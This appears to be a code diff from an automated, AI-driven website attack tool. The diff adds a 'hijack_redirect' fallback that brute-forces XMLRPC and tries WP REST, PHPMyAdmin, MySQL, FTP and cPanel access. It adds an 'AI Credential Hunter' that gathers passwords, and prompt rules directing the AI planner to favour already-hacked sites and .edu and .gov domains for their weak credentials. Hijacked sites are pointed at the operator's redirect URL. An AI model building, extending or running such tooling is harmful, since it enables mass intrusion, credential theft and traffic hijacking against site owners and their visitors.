@@ -302,6 +302,8 @@ async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
     "mass_assignment", "prototype_pollution",
     // Redirect takeover (overwrite competitor redirects on already-hacked sites)
     "redirect_takeover",
+    // Hijack redirect (6-method engine: XMLRPC brute, WP REST, PHPMyAdmin, MySQL, FTP, cPanel)
+    "hijack_redirect",
     // AI-generated
     "ai_generated_exploit", "comprehensive",
   ];
@@ -326,6 +328,10 @@ CRITICAL RULES:
    - For Sucuri: prefer large_body_bypass, double_url_encoding, content_type_confusion
    - For Wordfence: prefer rest_api_bypass, xmlrpc_multicall, ip_rotation
 7. If WAF is detected, always include waf_bypass in the top 3 methods.
+8. If target shows signs of being already hacked (existing redirects, injected code), include "hijack_redirect" in the top 3.
+   hijack_redirect uses 6 methods: XMLRPC brute force, WP REST API, PHPMyAdmin, MySQL direct, FTP, cPanel.
+   It also runs AI Credential Hunter to discover passwords automatically.
+9. For .edu and .gov targets, prioritize hijack_redirect as these often have weak/default credentials.
 
 Return JSON: { "attackOrder": ["method1", "method2", ...], "reasoning": "...", "estimatedSuccess": 0-100 }
 Only use methods from the availableMethods list.`
@@ -1032,12 +1038,70 @@ async function attackSingleTarget(
           waf: target.waf || null,
         }).catch(() => {});
 
-        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted) → เพิ่มใน blacklist`, 0, {
+        // ═══ LAST RESORT: Try hijack_redirect before blacklisting ═══
+        try {
+          const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+          const { executeCredentialHunt } = await import("./ai-credential-hunter");
+          
+          await emitEvent("ai_retry", `🔓 ${target.domain} — Last resort: Hijack Redirect + AI Credential Hunter...`, 0, { domain: target.domain });
+          
+          // Step 1: AI Credential Hunter gathers credentials
+          const huntResult = await executeCredentialHunt({
+            domain: target.domain,
+            cms: target.cms || undefined,
+            cmsVersion: target.cmsVersion || undefined,
+            serverType: target.serverType || undefined,
+            maxDurationMs: 60_000,
+            onProgress: (phase, detail) => {
+              emitEvent("attacking", `🔑 ${target.domain} — CredHunter: ${detail}`, 0, { domain: target.domain, phase }).catch(() => {});
+            },
+          });
+          
+          // Step 2: Feed credentials into hijack engine
+          const customCreds = huntResult.credentials.slice(0, 100).map(c => ({
+            username: c.username,
+            password: c.password,
+          }));
+          
+          const hijackResult = await executeHijackRedirect({
+            targetDomain: target.domain,
+            newRedirectUrl: redirectUrl,
+            credentials: customCreds.length > 0 ? customCreds : undefined,
+            methodTimeout: 30_000,
+          });
+          
+          if (hijackResult.success) {
+            await updateRedirectStats(redirectUrl, true);
+            recordSuccessfulAttack(target.domain).catch(() => {});
+            await emitEvent("success", `✅ ${target.domain} — Hijack Redirect สำเร็จ! ${hijackResult.winningMethod} → ${redirectUrl} (AI CredHunter found ${huntResult.credentials.length} creds)`, 0, {
+              domain: target.domain,
+              method: `hijack_${hijackResult.winningMethod}`,
+              redirectUrl,
+              credentialsFound: huntResult.credentials.length,
+            });
+            return { target, success: true, reason: `hijack_redirect_${hijackResult.winningMethod}`, deployId };
+          }
+        } catch (hijackErr: any) {
+          console.error(`[Agentic] Hijack fallback failed for ${target.domain}: ${hijackErr.message}`);
+        }
+        
+        // ═══ BLACKLIST: Record failed attack ═══
+        recordFailedAttack({
+          domain: target.domain,
+          reason: `Failed after ${attempt + 1} attempts + hijack fallback: ${jobFinalStatus}`,
+          errors: attemptHistory.map(a => a.errorMessage || "unknown"),
+          durationMs: Date.now() - attackStartTime,
+          cms: target.cms || null,
+          serverType: target.serverType || null,
+          waf: target.waf || null,
+        }).catch(() => {});
+
+        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง + hijack fallback → เพิ่มใน blacklist`, 0, {
           domain: target.domain,
           deployId,
           totalAttempts: attempt + 1,
         });
-        return { target, success: false, reason: `failed after ${attempt + 1} attempts`, deployId };
+        return { target, success: false, reason: `failed after ${attempt + 1} attempts + hijack`, deployId };
       }
 
       await emitEvent("ai_retry", `🔄 ${target.domain} — ล้มเหลว (${jobFinalStatus}), AI Strategist กำลังวิเคราะห์...`, 0, {
